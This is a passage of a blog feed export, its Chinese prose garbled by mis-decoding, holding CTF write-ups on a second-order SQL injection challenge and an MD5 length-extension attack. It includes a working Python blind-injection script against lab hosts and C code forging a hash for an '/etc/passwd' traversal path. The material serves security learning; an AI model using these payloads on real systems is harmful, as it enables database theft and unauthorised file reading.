        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[è¿‡æ»¤é€—å·|ascii|from for|substr]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803133553856.png" alt="image-20210803133553856"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ‰«ç›®å½•æ‰«å‡º<code>register.php</code>ï¼ŒçœŸæ— è¯­ï¼Œåˆè¦æ‰«</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803140744991.png" alt="image-20210803140744991"></p><p>å¥½æ´»</p><p>æ²¡æƒ³åˆ°æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å…¥ç‚¹åœ¨register.phpçš„usernameé‡Œ</p><p>fuzzä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803154649246.png" alt="image-20210803154649246"></p><p>è¿™ä¿©è¢«å±è”½äº†</p><p>æµ‹è¯•ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;123@qq.com&amp;username&#x3D;1&#39;and &#39;0&amp;password&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†ç™»å½•ï¼Œç”¨æˆ·åå¤„æ˜¾ç¤ºä¸º0ï¼Œæœç„¶æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œè€Œä¸”æ˜¯å•å¼•å·é—­åˆ</p><p>è¯•äº†ä¸‹#å’Œâ€“æ³¨é‡Šä¸å¤ªè¡Œï¼Œå¾—è€è€å®å®ç”¨å•å¼•å·äº†ã€‚</p><h3 id="Mysql-å­—ç¬¦ä¸²è¿ç®—"><a href="#Mysql-å­—ç¬¦ä¸²è¿ç®—" class="headerlink" title="Mysql å­—ç¬¦ä¸²è¿ç®—"></a>Mysql å­—ç¬¦ä¸²è¿ç®—</h3><p>æ¥å¤ä¹ ä¸‹mysqlçš„å­—ç¬¦ä¸²è¿ç®—</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select &#39;1&#39; + &#39;2&#39;# 3select &#39;1&#39;+database()+&#39;0&#39;;#1select &#39;0&#39;+hex(database())+&#39;0&#39;;#776562 -&gt; webçš„16è¿›åˆ¶select &#39;0&#39;+ascii(substr(database(),1,1))+&#39;0&#39;;#119 -&gt; wçš„asciiç select &#39;0&#39;+ascii(substr(database() from 1 for 1))+&#39;0&#39;;##119 -&gt; wçš„asciiç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜ç¡®äº†ã€‚å°±è¿™æ ·æ…¢æ…¢çˆ¬å§</p><p>æ­£å¥½å‰å‡ å¤©å¤ä¹ äº†çˆ¬è™«ï¼Œå†™ä¸ªä¸€é”®è„šæœ¬ï¼Œæ–¹ä¾¿çœ‹ç»“æœã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> random<span class="token keyword">import</span> timeresult <span class="token operator">=</span> <span class="token string">''</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token string">"0'+ascii(substr(database() from &#123;&#125; for 1))+'0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'@qq.com'</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://1659e029-c62b-428e-81b6-6b343a56587c.node4.buuoj.cn/register.php"</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"3catttkq2fc27pht26qm7qn5c2"</span><span class="token punctuation">&#125;</span>    burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>                     <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn/register.php"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>    burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    r1 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span>                      cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://1659e029-c62b-428e-81b6-6b343a56587c.node4.buuoj.cn/login.php"</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"3catttkq2fc27pht26qm7qn5c2"</span><span class="token punctuation">&#125;</span>    burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>                     <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn/login.php"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>    burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    r2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span>                      cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span> class_<span class="token operator">=</span><span class="token string">'user-name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>string<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># ç”¨xpathè·å–å…ƒç´ </span>    <span class="token comment"># from lxml import etree</span>    <span class="token comment"># html = etree.HTML(r2.text)</span>    <span class="token comment"># name = html.xpath('//*[@id="menu"]/div/div/span//text()')[0].strip()</span>    last <span class="token operator">=</span> result    <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> last<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]'</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803173725427-16279834459281.png" alt="image-20210803173725427"></p><p>å¯è¡Œ</p><p>é‚£äº›æ¥å°±ç»§ç»­è·‘è„šæœ¬å§</p><p>å€¼å¾—ä¸€æçš„äº‹è¡¨åä¸çŸ¥é“ï¼Œæ˜¯flagï¼Œå¾—çŒœã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">username <span class="token operator">=</span> <span class="token string">"0'+ascii(substr((select * from flag) from &#123;&#125; for 1))+'0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803173933309-16279835738782-16279835744473.png" alt="image-20210803173933309"></p><p>ç»“æŸ</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> äºŒæ¬¡æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5é•¿åº¦æ‰©å±•æ”»å‡»</title>
      <link href="/p/1343946995.html"/>
      <url>/p/1343946995.html</url>
      
        <content type="html"><![CDATA[<h2 id="MD5åŸç†"><a href="#MD5åŸç†" class="headerlink" title="MD5åŸç†"></a>MD5åŸç†</h2><blockquote><p>1.MD5åŠ å¯†è¿‡ç¨‹ä¸­512æ¯”ç‰¹ï¼ˆ64å­—èŠ‚ï¼‰ä¸ºä¸€ç»„ï¼Œå±äºåˆ†ç»„åŠ å¯†ï¼Œè€Œä¸”åœ¨è¿ç®—çš„è¿‡ç¨‹ä¸­ï¼Œå°†512æ¯”ç‰¹åˆ†ä¸º32bit*16å—ï¼Œåˆ†å—è¿ç®—<br>2.æˆ‘ä»¬å…³é”®åˆ©ç”¨çš„æ˜¯MD5çš„å¡«å……ï¼Œå¯¹åŠ å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œå¡«å……(æ¯”ç‰¹ç¬¬ä¸€ä½ä¸º1å…¶ä½™æ¯”ç‰¹ä¸º0)ï¼Œä½¿ä¹‹(äºŒè¿›åˆ¶)è¡¥åˆ°448æ¨¡512åŒä½™ï¼Œå³é•¿åº¦ä¸º512çš„å€æ•°å‡64ï¼Œæœ€åçš„64ä½åœ¨è¡¥å……ä¸ºåŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ ·åˆšå¥½è¡¥æ»¡512ä½çš„å€æ•°ï¼Œå¦‚æœå½“å‰æ˜æ–‡æ­£å¥½æ˜¯512bitå€æ•°åˆ™å†åŠ ä¸Šä¸€ä¸ª512bitçš„ä¸€ç»„ã€‚<br>3.MD5ä¸ç®¡æ€ä¹ˆåŠ å¯†ï¼Œæ¯ä¸€å—åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡IVï¼Œè¿™ä¸€ç‚¹å¾ˆå…³é”®ï¼ï¼ï¼</p></blockquote><h3 id="1-å¡«å……-å¢åŠ é•¿åº¦"><a href="#1-å¡«å……-å¢åŠ é•¿åº¦" class="headerlink" title="1.å¡«å……+å¢åŠ é•¿åº¦"></a>1.å¡«å……+å¢åŠ é•¿åº¦</h3><p>å°†æ•°æ®è¿›è¡Œå¡«å……ï¼Œé¦–å…ˆæ·»åŠ <code>0Ã—80</code>ï¼Œæ¥ç€æ·»åŠ <code>0Ã—00</code>ä½¿å¾—(æ–°å­—ç¬¦ä¸²å­—èŠ‚æ•°+8)%64=0ï¼Œ8ä¸ªå­—èŠ‚å­˜çš„æ˜¯åŸå§‹å­—ç¬¦ä¸²é•¿åº¦</p><pre class="line-numbers language-none"><code class="language-none">len(secret) + len(&quot;test.pdf&quot;) + len(padding) + 8 &#x3D;&#x3D; 64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸¾ä¾‹ï¼š</p><p>å­—ç¬¦ä¸²ï¼šadminï¼Œ16è¿›åˆ¶ï¼š0x61646d696e</p><blockquote><p>äºŒè¿›åˆ¶ï¼š1111 1111</p><p>16è¿›åˆ¶ï¼šF    F</p><p>ASCIIï¼š1å­—ç¬¦=1å­—èŠ‚(Byte)==8ä½(bit)</p></blockquote><p>ç¬¬ä¸€æ­¥ï¼š</p><p>0x61646d696eåé¢è¡¥äºŒè¿›åˆ¶1000 0000 0000 000000000â€¦</p><p>æ‰€ä»¥ç¬¬ä¸€ä¸ªæ•°çš„16è¿›åˆ¶æ•°ä¸º8</p><p>ä¸€ç›´è¡¥åˆ°bitæ•°=448ï¼Œç›®çš„æ˜¯**(bit mod 512)=(448 mod 512)**</p><p>448ä½(bit)=56å­—èŠ‚(Byte)=112ä¸ªåå…­è¿›åˆ¶æ•°</p><pre class="line-numbers language-none"><code class="language-none">admin:0x61646d696eè¡¥ï¼š800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒæ­¥ï¼š</p><p>è¡¥éœ€è¦åŠ å¯†æ˜æ–‡çš„é•¿åº¦ï¼Œadminé•¿åº¦ä¸º5ï¼Œä¹Ÿå°±æ˜¯5*8=40ä½=0x28h</p><blockquote><p>MD5ä¸­å­˜å‚¨çš„éƒ½æ˜¯å°ç«¯æ–¹å¼,0x12345678å­˜å‚¨çš„æ—¶å€™æ˜¯78 56 34 12</p></blockquote><p>æ‰€ä»¥åé¢çš„64ä½=8å­—èŠ‚=16ä¸ªåå…­è¿›åˆ¶æ•°ä¸º</p><pre class="line-numbers language-none"><code class="language-none">2800000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆä¸€ä¸‹ï¼Œå°±æ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-è½®æ¬¡å˜æ¢"><a href="#2-è½®æ¬¡å˜æ¢" class="headerlink" title="2.è½®æ¬¡å˜æ¢"></a>2.è½®æ¬¡å˜æ¢</h3><p>ä»¥64å­—èŠ‚=512ä½ä¸º1ç»„è¿›è¡Œè½®æ¬¡å˜æ¢ï¼Œè¿™ä¸€ç»„ä¸­ä»¥4å­—èŠ‚ä¸º1ä¸ªå•ä½åˆ†æˆ16å­åˆ†ç»„ã€‚</p><p>ç„¶åå‡†å¤‡ABCDå››ä¸ª32ä½çš„å­—ç¬¦ï¼Œè¿™å‡ ä¸ªæ˜¯å›ºå®šçš„MD5ç®—æ³•ç‰¹å¾å€¼ã€‚</p><blockquote><p>ç‰©ç†é¡ºåºï¼šA=0x01234567ï¼ŒB=0x89ABCDEFï¼ŒC=0xFEDCBA98ï¼ŒD=0x76543210</p><p>MD5ä»¥å°ç«¯å­˜å‚¨ï¼šA=0Ã—67452301, B=0xEFCDAB89, C=0x98BADCFE, D=0Ã—10325476</p></blockquote><p>å°†ABCDä½œä¸ºç§å­ï¼Œä¸16ä¸ªå­åˆ†ç»„è¿›è¡Œä¸€ç§<strong>å¤æ‚çš„è¿ç®—</strong>ï¼Œè¿ç®—ç»“æœä¸ºA1ã€B1ã€C1ã€D1,</p><p>ä»¥A1ã€B1ã€C1ã€D1ä¸ºç§å­ç„¶åé‡å¤è¿™ä¸ªè¿‡ç¨‹è®¡ç®—æœ€åå¾—åˆ°Anã€Bnã€Cnã€Dnã€‚</p><p><img src="/../images/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/5b5d9ca7bf5e2.png" alt="5b5d9ca7bf5e2"></p><h2 id="æ‰©å±•æ”»å‡»"><a href="#æ‰©å±•æ”»å‡»" class="headerlink" title="æ‰©å±•æ”»å‡»"></a>æ‰©å±•æ”»å‡»</h2><blockquote><p>å¦‚ä½•åœ¨ä¸çŸ¥é“<strong>salt/key/secret</strong>çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä¸€ä¸ªæ–‡ä»¶åçš„åˆæ³•hashå€¼</p></blockquote><p>å‰é¢è¯´åˆ°å¡«å……ï¼Œå°±æ˜¯é•¿åº¦æ‰©å±•æ”»å‡»çš„å…³é”®æ‰€åœ¨ã€‚</p><p><code>M1=md5(secret+&#39;test.pdf&#39;)</code></p><p><code>M2=md5(secret+&#39;flag.txt&#39;)</code></p><p>secretçš„é•¿åº¦ä¸º10,<code>M1</code>=6543109bb53887f7bb46fe424f26e24a,æ±‚<code>M2</code></p><p>äºæ˜¯ï¼Œå…ˆå¡«å……ï¼Œå°†å…¶è¡¥å……åˆ°64Byte</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"test.pdf"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padding<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10+8+x+8=64ï¼Œx=38,ä¹Ÿå°±æ˜¯è¯´å¡«å……çš„é•¿åº¦ä¸º38Byte:<code>0x80</code>+<code>0x00</code>*37</p><pre class="line-numbers language-none"><code class="language-none">secret + &quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + &quot;\x90\x00\x00\x00\x00\x00\x00\x00&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·çš„è¯ï¼Œé•¿åº¦å°±ä¸º64Byteï¼Œæ»¡è¶³ç¬¬ä¸€è½®çš„è®¡ç®—å—ï¼Œåç»­å†åŠ å†…å®¹å°±æ˜¯æ–°çš„è®¡ç®—å—ã€‚</p><blockquote><p>å½“ä¸€ä¸ªå—è®¡ç®—å®Œæˆåï¼ŒABCDå››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼å°±æ˜¯åˆšè®¡ç®—å®Œçš„ hash å€¼ï¼Œå¦‚æœåé¢è¿˜æœ‰æ•°æ®å—ï¼Œé‚£ä¹ˆä¼šåœ¨å·²æœ‰çš„ABCDå››ä¸ªå¯„å­˜å™¨ä¸­çš„å€¼ä¸Šè¿›è¡Œæ›´æ–°</p></blockquote><p>æ„é€ æ–‡ä»¶åä¸º</p><pre class="line-numbers language-none"><code class="language-none">&quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + &quot;\x90\x00\x00\x00\x00\x00\x00\x00&quot;+&#39;flag.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯ï¼Œç¬¬ä¸€è½®è®¡ç®—å—ï¼Œç»“æœå°±æ˜¯<code>M1</code>,è¿™æ˜¯ä¸€ä¸ªåˆæ³•å€¼ï¼Œå°†<code>M1</code>æ”¾å…¥ä¸‹ä¸€è½®è®¡ç®—å—çš„ABCDå¯„å­˜å™¨ã€‚å»è®¡ç®—<code>flag.txt</code>,<strong>åˆæ³•çš„ABCDå¾—å‡ºä¹Ÿæ˜¯åˆæ³•çš„hash</strong>ï¼Œäºæ˜¯å°±ç®—å‡ºäº†<code>M2</code></p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><img src="/../images/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20210802231206242.png" alt="image-20210802231206242"></p><p>ç”¨Cè¯­è¨€å¤ç°ä¸‹å…¶æ“ä½œå°±æ˜¯</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;openssl/md5.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>MD5_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>  MD5_CTX c<span class="token punctuation">;</span>  <span class="token function">MD5_Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//64ä¸ªAæ— æ‰€è°“æ˜¯ä»€ä¹ˆ,åªæ˜¯è®©å®ƒå®Œæˆç¬¬ä¸€ä¸ªè®¡ç®—å—</span>  <span class="token function">MD5_Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">,</span> <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//M1=0x6543109bb53887f7bb46fe424f26e24aï¼Œæ³¨æ„å¤§å°ç«¯</span>  c<span class="token punctuation">.</span>A <span class="token operator">=</span> <span class="token number">0x9b104365</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>B <span class="token operator">=</span> <span class="token number">0xf78738b5</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>C <span class="token operator">=</span> <span class="token number">0x42fe46bb</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>D <span class="token operator">=</span> <span class="token number">0x4ae2264f</span><span class="token punctuation">;</span>  <span class="token function">MD5_Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">,</span> <span class="token string">"/../../../../etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MD5_Final</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://lightless.me/archives/hash-extender-attack.html">å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[NPUCTF2020]ezinclude</title>
      <link href="/p/2193317358.html"/>
      <url>/p/2193317358.html</url>
      
